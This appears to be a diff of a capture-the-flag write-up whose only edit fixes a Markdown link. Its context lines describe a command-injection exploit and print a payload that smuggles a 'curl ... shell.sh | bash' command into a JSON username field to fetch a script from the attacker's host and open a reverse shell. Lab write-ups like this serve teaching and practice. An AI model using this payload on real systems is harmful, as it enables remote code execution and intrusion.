@@ -380,7 +380,7 @@ The response confirms that our injected command was executed with the privileges
 
 We'll exploit this vulnerability to execute commands on the server and obtain a reverse shell.
 #### 5) Reverse shell
-We used the same method explained in [Three](./Three) Box.
+We used the same method explained in [Three](./Three.md) Box.
 After setting up our reverse shell, we sent the payload to execute our `shell.sh` script on the target machine: `{ "username":"test;curl 10.10.15.212:8000/shell.sh | bash;"}` 
 
 > [!NOTE]
